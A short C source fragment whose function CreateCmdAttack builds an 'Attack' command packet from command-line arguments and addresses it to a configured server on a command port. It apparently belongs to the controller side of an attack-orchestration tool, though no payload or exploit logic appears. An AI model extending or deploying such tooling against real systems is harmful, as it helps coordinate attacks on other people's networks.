
#include "interface/interface.h"
#include "interface/configr.h"

Packet * CreateCmdAttack( int argc, char ** argv )
{
    CommandPkt *cmdPkt = NULL;
    Packet *pac = CreateEmptyPacket();
    LhfDraft *draft = CreateDraft(argc, argv);
    char *srvip = GetServerIP();

    memalloc( &cmdPkt , sizeof(CommandPkt) );
    cmdPkt->type = Attack;
    cmdPkt->dataSize = sizeof(LhfDraft);
    memcpy(&cmdPkt->data, draft, cmdPkt->dataSize);
    memfree(draft);

    pac->type = LHF;
    pac->packet_ptr = cmdPkt;
    pac->pkt_size = COMMANDPKT_HEADERSIZE + cmdPkt->dataSize;
    strcpy( pac->ip_dest,srvip);
    pac->dest_port = DEFAULT_COMPORT;

    return pac;
}
